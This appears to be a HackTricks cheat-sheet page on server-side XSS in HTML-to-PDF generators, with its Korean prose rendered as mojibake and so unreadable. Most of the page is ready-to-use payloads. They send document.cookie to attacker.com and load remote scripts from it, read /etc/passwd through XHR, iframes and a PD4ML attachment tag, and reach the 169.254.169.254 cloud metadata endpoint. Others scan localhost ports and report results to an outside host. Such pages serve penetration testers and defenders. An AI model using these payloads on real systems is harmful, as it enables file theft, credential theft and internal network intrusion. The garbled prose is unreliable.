# Server Side XSS (Dynamic PDF)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side XSS (Dynamic PDF)

ì‚¬ìš©ì ì œì–´ ì…ë ¥ì„ ì‚¬ìš©í•˜ì—¬ PDFë¥¼ ìƒì„±í•˜ëŠ” ì›¹ í˜ì´ì§€ê°€ ìˆëŠ” ê²½ìš°, PDFë¥¼ ìƒì„±í•˜ëŠ” ë´‡ì„ **ì†ì—¬ì„œ ì„ì˜ì˜ JS ì½”ë“œë¥¼ ì‹¤í–‰**í•˜ë„ë¡ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ **PDF ìƒì„±ê¸° ë´‡ì´** ì–´ë–¤ ì¢…ë¥˜ì˜ **HTML** **íƒœê·¸**ë¥¼ ì°¾ìœ¼ë©´, ì´ë¥¼ **í•´ì„**í•˜ê²Œ ë˜ê³ , ì´ ë™ì‘ì„ **ì•…ìš©**í•˜ì—¬ **ì„œë²„ XSS**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`<script></script>` íƒœê·¸ëŠ” í•­ìƒ ì‘ë™í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ, JSë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ë‹¤ë¥¸ ë°©ë²•ì´ í•„ìš”í•©ë‹ˆë‹¤(ì˜ˆ: `<img` ì•…ìš©).\
ë˜í•œ, ì¼ë°˜ì ì¸ ìµìŠ¤í”Œë¡œì‡ì—ì„œëŠ” ìƒì„±ëœ PDFë¥¼ **ë³´ê³ /ë‹¤ìš´ë¡œë“œí•  ìˆ˜** ìˆìœ¼ë¯€ë¡œ, **JSë¥¼ í†µí•´ ì‘ì„±í•œ ëª¨ë“  ê²ƒ**ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì˜ˆ: `document.write()` ì‚¬ìš©). ê·¸ëŸ¬ë‚˜ ìƒì„±ëœ PDFë¥¼ **ë³¼ ìˆ˜ ì—†ë‹¤ë©´**, ì•„ë§ˆë„ **ì›¹ ìš”ì²­ì„ í†µí•´ ì •ë³´ë¥¼ ì¶”ì¶œí•´ì•¼** í•  ê²ƒì…ë‹ˆë‹¤(ë¸”ë¼ì¸ë“œ).

### Popular PDF generation

- **wkhtmltopdf**ëŠ” HTMLê³¼ CSSë¥¼ PDF ë¬¸ì„œë¡œ ë³€í™˜í•˜ëŠ” ëŠ¥ë ¥ìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆìœ¼ë©°, WebKit ë Œë”ë§ ì—”ì§„ì„ í™œìš©í•©ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ ëª…ë ¹ì¤„ ìœ í‹¸ë¦¬í‹°ë¡œ ì œê³µë˜ì–´ ë‹¤ì–‘í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **TCPDF**ëŠ” PDF ìƒì„±ì„ ìœ„í•œ PHP ìƒíƒœê³„ ë‚´ì—ì„œ ê°•ë ¥í•œ ì†”ë£¨ì…˜ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ë¯¸ì§€, ê·¸ë˜í”½ ë° ì•”í˜¸í™”ë¥¼ ì²˜ë¦¬í•  ìˆ˜ ìˆì–´ ë³µì¡í•œ ë¬¸ì„œë¥¼ ìƒì„±í•˜ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤.
- Node.js í™˜ê²½ì—ì„œ ì‘ì—…í•˜ëŠ” ê²½ìš°, **PDFKit**ì´ ìœ íš¨í•œ ì˜µì…˜ì„ ì œê³µí•©ë‹ˆë‹¤. HTML ë° CSSì—ì„œ ì§ì ‘ PDF ë¬¸ì„œë¥¼ ìƒì„±í•  ìˆ˜ ìˆì–´ ì›¹ ì½˜í…ì¸ ì™€ ì¸ì‡„ ê°€ëŠ¥í•œ í˜•ì‹ ê°„ì˜ ë‹¤ë¦¬ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
- Java ê°œë°œìëŠ” PDF ìƒì„±ë¿ë§Œ ì•„ë‹ˆë¼ ë””ì§€í„¸ ì„œëª… ë° ì–‘ì‹ ì‘ì„±ê³¼ ê°™ì€ ê³ ê¸‰ ê¸°ëŠ¥ì„ ì§€ì›í•˜ëŠ” **iText** ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì„ í˜¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í¬ê´„ì ì¸ ê¸°ëŠ¥ ì„¸íŠ¸ëŠ” ì•ˆì „í•˜ê³  ìƒí˜¸ì‘ìš©ì´ ê°€ëŠ¥í•œ ë¬¸ì„œë¥¼ ìƒì„±í•˜ëŠ” ë° ì í•©í•©ë‹ˆë‹¤.
- **FPDF**ëŠ” ë‹¨ìˆœì„±ê³¼ ì‚¬ìš© ìš©ì´ì„±ìœ¼ë¡œ êµ¬ë³„ë˜ëŠ” ë˜ ë‹¤ë¥¸ PHP ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. ê´‘ë²”ìœ„í•œ ê¸°ëŠ¥ì´ í•„ìš” ì—†ëŠ” PDF ìƒì„±ì„ ì›í•˜ëŠ” ê°œë°œìë¥¼ ìœ„í•´ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤.


## Payloads

### Discovery
```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG

ì´ì „ì˜ ëª¨ë“  í˜ì´ë¡œë“œëŠ” ì´ SVG í˜ì´ë¡œë“œ ë‚´ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Burpcollab ì„œë¸Œë„ë©”ì¸ì— ì ‘ê·¼í•˜ëŠ” iframeê³¼ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•˜ëŠ” ë˜ ë‹¤ë¥¸ iframeì´ ì˜ˆë¡œ ì œì‹œë©ë‹ˆë‹¤.
```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
<g>
<foreignObject width="800" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
</body>
</foreignObject>
</g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>
<script type="text/javascript">
// <![CDATA[
alert(1);
// ]]>
</script>
</svg>
```
ë§ì€ **ë‹¤ë¥¸ SVG í˜ì´ë¡œë“œ**ë¥¼ [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê²½ë¡œ ë…¸ì¶œ
```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### Load an external script

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ê°€ì¥ ì í•©í•œ ë°©ë²•ì€ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ë´‡ì´ ë¡œì»¬ì—ì„œ ë‹¹ì‹ ì´ ì œì–´í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë¡œë“œí•˜ë„ë¡ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ë¡œì»¬ì—ì„œ í˜ì´ë¡œë“œë¥¼ ë³€ê²½í•˜ê³  ë§¤ë²ˆ ë™ì¼í•œ ì½”ë“œë¡œ ë´‡ì´ ì´ë¥¼ ë¡œë“œí•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### ë¡œì»¬ íŒŒì¼ ì½ê¸° / SSRF

{% hint style="warning" %}
`file:///etc/passwd`ë¥¼ `http://169.254.169.254/latest/user-data`ë¡œ ë³€ê²½í•˜ì—¬ **ì™¸ë¶€ ì›¹ í˜ì´ì§€ì— ì ‘ê·¼í•´ ë³´ì„¸ìš” (SSRF)**.

SSRFê°€ í—ˆìš©ë˜ì§€ë§Œ **í¥ë¯¸ë¡œìš´ ë„ë©”ì¸ì´ë‚˜ IPì— ë„ë‹¬í•  ìˆ˜ ì—†ëŠ” ê²½ìš°**, [ì´ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì—¬ ìš°íšŒ ë°©ë²•ì„ ì°¾ì•„ë³´ì„¸ìš”](../ssrf-server-side-request-forgery/url-format-bypass.md).
{% endhint %}
```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```
### ë´‡ ì§€ì—°
```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
let time = 500;
setInterval(()=>{
let img = document.createElement("img");
img.src = `https://attacker.com/ping?time=${time}ms`;
time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```
### í¬íŠ¸ ìŠ¤ìº”
```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}

for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```
### [SSRF](../ssrf-server-side-request-forgery/)

ì´ ì·¨ì•½ì ì€ SSRFë¡œ ë§¤ìš° ì‰½ê²Œ ë³€í™˜ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ìŠ¤í¬ë¦½íŠ¸ê°€ ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤). ê·¸ëŸ¬ë‹ˆ ì´ë¥¼ ì´ìš©í•´ ë³´ì„¸ìš”(ë©”íƒ€ë°ì´í„°ë¥¼ ì½ì–´ë³´ì„¸ìš”?).

### Attachments: PD4ML

PDFì— **ì²¨ë¶€íŒŒì¼ì„ ì§€ì •í•  ìˆ˜ ìˆëŠ”** HTML 2 PDF ì—”ì§„ì´ ëª‡ ê°€ì§€ ìˆìŠµë‹ˆë‹¤, ì˜ˆë¥¼ ë“¤ì–´ **PD4ML**. ì´ ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ **PDFì— ë¡œì»¬ íŒŒì¼ì„ ì²¨ë¶€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì²¨ë¶€íŒŒì¼ì„ ì—´ê¸° ìœ„í•´ **Firefoxë¡œ íŒŒì¼ì„ ì—´ê³  í´ë¦½ ê¸°í˜¸ë¥¼ ë”ë¸” í´ë¦­í•˜ì—¬** ì²¨ë¶€íŒŒì¼ì„ ìƒˆ íŒŒì¼ë¡œ **ì €ì¥í–ˆìŠµë‹ˆë‹¤**.\
burpë¡œ **PDF ì‘ë‹µì„ ìº¡ì²˜í•˜ë©´** PDF ë‚´ì—ì„œ **ì²¨ë¶€íŒŒì¼ì´ ì¼ë°˜ í…ìŠ¤íŠ¸ë¡œ í‘œì‹œë©ë‹ˆë‹¤**.

{% code overflow="wrap" %}
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
{% endcode %}

## References

* [https://lbherrera.github.io/lab/h1415-ctf-writeup.html](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
* [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
* [https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
